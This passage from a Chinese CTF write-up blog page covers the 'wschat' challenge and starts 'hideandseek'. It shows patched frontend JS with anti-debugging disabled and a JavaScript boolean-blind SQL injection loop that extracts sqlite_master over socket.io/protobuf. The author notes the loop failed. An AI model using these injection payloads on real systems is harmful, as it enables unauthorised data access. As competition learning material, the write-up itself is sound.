class="javascript">&#125;, <span class="number">0xfa0</span>);</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">_0x6c017f</span>(<span class="params">_0x19de66</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">_0x2ed5ce</span>(<span class="params">_0x255d4e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// if (typeof _0x255d4e === &#x27;string&#x27;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     return function (_0x11534e) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;[&#x27;constructor&#x27;](&#x27;while\x20(true)\x20&#123;&#125;&#x27;)[&#x27;apply&#x27;](&#x27;counter&#x27;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// else</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     (&#x27;&#x27; + _0x255d4e / _0x255d4e)[&#x27;length&#x27;] !== 0x1 || _0x255d4e % 0x14 === 0x0 ? function () &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         return !![];</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;[&#x27;constructor&#x27;](&#x27;debu&#x27; + &#x27;gger&#x27;)[&#x27;call&#x27;](&#x27;action&#x27;) : function () &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//         return ![];</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     &#125;[&#x27;constructor&#x27;](&#x27;debu&#x27; + &#x27;gger&#x27;)[&#x27;apply&#x27;](&#x27;stateObject&#x27;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// _0x2ed5ce(++_0x255d4e);</span></span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (_0x19de66)</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> _0x2ed5ce;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">            _0x2ed5ce(<span class="number">0x0</span>);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">catch</span> (_0xf40179) &#123;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>对于前两个部分，毕竟都是在前端的操作，我们自然是可以操作的了，上面的代码已经是我经过patch后的了，我们采用一个代理工具<code>charles</code> 把根目录的html的js部分替换为上述部分：</p>
+<p><img src="/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/assets/image-20211209110846004.png" alt="image-20211209110846004"></p>
+<p>(在Map to local path部分修改为本地文件，这样在经过代理，到我们浏览器的环境都是我经过patch的js了。)</p>
+<p>elegant-crazy师傅采用的是burp在代理设置的时候把alert()return那些部分替换为空了，能绕过对username的检测，但是绕不过反调试。</p>
+<p>然后就到了第三部分，提示里说了sqli me,显然是一个sql注入了，hint里说了是用sqlite的数据库，</p>
+<p>上网查了一下所有sqlite的注入技巧：学习资料：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10308#toc-10">https://xz.aliyun.com/t/10308#toc-10</a></p>
+<p><img src="/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/assets/image-20211209111251765.png" alt="image-20211209111251765"></p>
+<p>注入点太明显了，没有任何过滤，但是回显只有两种，只能采用盲注的办法。盲注的脚本在上述文章里也有现成的，出这题胜利在望，结果这才是折磨的开始。</p>
+<p>elegant-crazy师傅是用python调了protobuf库，实现的盲注，所有的sock事件全要自己手写一遍，很是累， 我寻思着在js里人家都写好了，我直接在js部分添加了盲注的部分就好了：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;login_ret&#x27;</span>, <span class="function">(<span class="params">_0x253784, _0x4ca143</span>) =&gt;</span> &#123;</span><br><span class="line">        _0x253784 ? (</span><br><span class="line">            <span class="built_in">console</span>.log(_0x4ca143),</span><br><span class="line">            returned = (_0x4ca143.indexOf(<span class="string">&quot;成功&quot;</span>) != -<span class="number">1</span>),</span><br><span class="line">            locked = <span class="literal">true</span>) : (</span><br><span class="line">            _0x1f4215 = _0x29d952[<span class="string">&#x27;value&#x27;</span>], <span class="comment">/*alert(_0x4ca143),*/</span></span><br><span class="line">            returned = (_0x4ca143.indexOf(<span class="string">&quot;成功&quot;</span>) != -<span class="number">1</span>),</span><br><span class="line">            locked = <span class="literal">true</span>, </span><br><span class="line">            <span class="built_in">console</span>.log(_0x4ca143));</span><br><span class="line">    &#125;); </span><br><span class="line">    <span class="keyword">var</span> ans = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">     flag = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">let</span> low = <span class="number">32</span>;</span><br><span class="line">     <span class="keyword">let</span> high = <span class="number">128</span>;</span><br><span class="line">     <span class="keyword">let</span> mid = (low+high )/ <span class="number">2</span></span><br><span class="line">     <span class="keyword">let</span> midchar = <span class="built_in">String</span>.fromCharCode(mid);</span><br><span class="line">     <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">let</span> payload = <span class="string">&quot;admin&#x27; and substr((select hex(group_concat(sql)) from sqlite_master),&quot;</span> + i + <span class="string">&quot;,1)&gt;&#x27;&quot;</span> + midchar + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> buffer = LoginReq[<span class="string">&#x27;create&#x27;</span>](&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="string">&quot;123&quot;</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(payload);</span><br><span class="line">        <span class="keyword">var</span> _0x581e63 = LoginReq[<span class="string">&#x27;encode&#x27;</span>](buffer)[<span class="string">&#x27;finish&#x27;</span>]();</span><br><span class="line">        <span class="comment">// locked = false;</span></span><br><span class="line">        sock[<span class="string">&#x27;emit&#x27;</span>](<span class="string">&#x27;login&#x27;</span>, _0x581e63[<span class="string">&#x27;slice&#x27;</span>]()[<span class="string">&#x27;buffer&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; <span class="number">1000000000</span>; j++)&#123;&#125;</span><br><span class="line">        <span class="comment">// while(locked == false)&#123;&#125;</span></span><br><span class="line">        locked = <span class="literal">false</span>; </span><br><span class="line">        <span class="built_in">console</span>.log(returned);</span><br><span class="line">        <span class="keyword">if</span> (returned === <span class="literal">false</span>)&#123;</span><br><span class="line">          low = mid + <span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          high = mid;</span><br><span class="line">       &#125;</span><br><span class="line">        mid = <span class="built_in">Math</span>.floor((low+high) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(mid === <span class="number">32</span> || mid === <span class="number">127</span>)&#123;flag = <span class="literal">true</span>; <span class="keyword">break</span>;&#125;</span><br><span class="line">        midchar = <span class="built_in">String</span>.fromCharCode(mid);</span><br><span class="line">        <span class="built_in">console</span>.log(mid);</span><br><span class="line">     &#125;</span><br><span class="line">     ans = ans + midchar; </span><br><span class="line">     <span class="built_in">console</span>.log(ans);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(ans);</span><br></pre></td></tr></table></figure>
+<p>但是结果不尽人意，所有的返回都是true，我的布尔盲注的结果需要依托<code>sock.io(login_ret)</code>这个事件触发后的回调函数的执行，可是因为这个事件执行并不是我们想象的那种串行的，所以导致顺序错乱，无法进行布尔盲注。</p>
+<p>解决措施有,就是加锁，设了一个全局变量，当且仅当回调函数执行时解锁，平时状态是死循环状态。elegant-crazy师傅就是采用的这种办法，能成功顺序返回，但是我加了锁之后就变成浏览器堵塞了，完全轮不到回调函数执行。</p>
+<p>思考了很久问题所在，也尝试用async和await的方法去强制等待事情的返回，强行延时1秒钟，但都失败了。</p>
+<p>第二天早上起来搜到了这两篇文章：<a target="_blank" rel="noopener" href="https://www.coder.work/article/5073843，https://stackoverflow.com/questions/51372997/socket-io-how-to-send-multiple-messages-sequentially">https://www.coder.work/article/5073843，https://stackoverflow.com/questions/51372997/socket-io-how-to-send-multiple-messages-sequentially</a></p>
+<p>大概意思就是node实现这块还用了一个缓冲区，等挤在到一定数量的时候才会发送，js盲注失败了。</p>
+<p>本题还可以用selenium模拟我的操作（但是我不会怎么挂代理替换js），毕竟有我思考上面问题的那段时间，我觉得我手工盲注也差不多该出了。</p>
+<p>一言以蔽之，还是用python实现protobuf的事件交互是最简单的。</p>
+<p>最后附上有关<code>sock.io</code>和<code>protobuf</code>的一些资料吧。</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://socket.gitbook.io/docs/">https://socket.gitbook.io/docs/</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.febeacon.com/protobuf_docs_zh_cn/routes/installation.html">http://www.febeacon.com/protobuf_docs_zh_cn/routes/installation.html</a></p>
+</blockquote>
+<h2 id="hideandseek"><a href="#hideandseek" class="headerlink" title="hideandseek"></a>hideandseek</h2><p>和web没有啥关系，和二进制全是关系。</p>
+<p>先附上打本地的DockerFile:</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> php:<span class="number">8.1</span>.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> ./src /var/www/html</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> ./flag /flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /var/www/html/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod -R  0555  /var/www/html/</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;php&quot;</span>, <span class="string">&quot;-S&quot;</span>, <span class="string">&quot;0.0.0.0:8000&quot;</span>, <span class="string">&quot;-t&quot;</span>, <span class="string">&quot;/var/www/html&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%AC%AC%E5%85%AD%E6%AC%A1%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#easyinject"><span class="nav-number">1.</span> <span class="nav-text">easyinject</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wschat"><span class="nav-number">2.</span> <span class="nav-text">wschat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hideandseek"><span class="nav-number">3.</span> <span class="nav-text">hideandseek</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="FYHSSGSS"
+      src="/images/saiki.jpg">
+  <p class="site-author-name" itemprop="name">FYHSSGSS</p>
+  <div class="site-description" itemprop="description">Do you like what you see</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/FYHSSGSS" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FYHSSGSS" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/FYH-SSGSS" title="Cnblog → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;FYH-SSGSS" rel="noopener" target="_blank"><i class="fab fa-bimobject fa-fw"></i>Cnblog</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-en" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://s0uthwood.github.io/" title="https:&#x2F;&#x2F;s0uthwood.github.io" rel="noopener" target="_blank">s0uthwood</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://kfxp12138.github.io/" title="https:&#x2F;&#x2F;kfxp12138.github.io" rel="noopener" target="_blank">triplewing</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://xz1548.github.io/" title="https:&#x2F;&#x2F;xz1548.github.io" rel="noopener" target="_blank">xz1548</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://justloseit.top/" title="https:&#x2F;&#x2F;justloseit.top&#x2F;" rel="noopener" target="_blank">Joker</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      <div id="music163player">
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=30482386&auto=1&height=66"></iframe>
+      </iframe>
+    </div>
+    
+    </div>
+    
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-flag"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">FYHSSGSS</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">95k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:26</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
